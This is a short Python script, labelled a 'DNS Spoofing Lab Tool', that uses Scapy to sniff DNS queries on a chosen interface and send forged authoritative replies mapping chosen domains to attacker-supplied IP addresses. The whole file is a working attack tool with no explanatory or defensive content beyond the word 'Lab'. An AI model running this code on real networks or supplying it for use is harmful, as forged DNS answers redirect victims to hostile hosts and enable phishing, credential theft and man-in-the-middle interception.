from scapy.all import *
import argparse

def process(pkt, spoof_map):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode().rstrip('.')

        for domain, ip in spoof_map.items():
            if domain in qname:

                print(f"[DNS] {qname} -> {ip}")

                reply = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                        UDP(dport=pkt[UDP].sport, sport=53) / \
                        DNS(
                            id=pkt[DNS].id,
                            qr=1,
                            aa=1,
                            qd=pkt[DNS].qd,
                            an=DNSRR(rrname=pkt[DNSQR].qname, rdata=ip)
                        )

                send(reply, verbose=0)
                break


def start(iface, mappings):
    spoof_map = {}

    for item in mappings:
        domain, ip = item.split(":")
        spoof_map[domain] = ip

    print("[*] DNS spoofing started")
    print("[*] Mapping:")
    for d, ip in spoof_map.items():
        print(f"    {d} -> {ip}")

    sniff(
        iface=iface,
        filter="udp port 53",
        prn=lambda pkt: process(pkt, spoof_map),
        store=0
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofing Lab Tool")

    parser.add_argument("-i", "--iface", required=True, help="Interface (e.g. eth0)")
    parser.add_argument(
        "-d", "--domain",
        action="append",
        required=True,
        help="Mapping in format domain:ip (can be used multiple times)"
    )

    args = parser.parse_args()

    start(args.iface, args.domain)
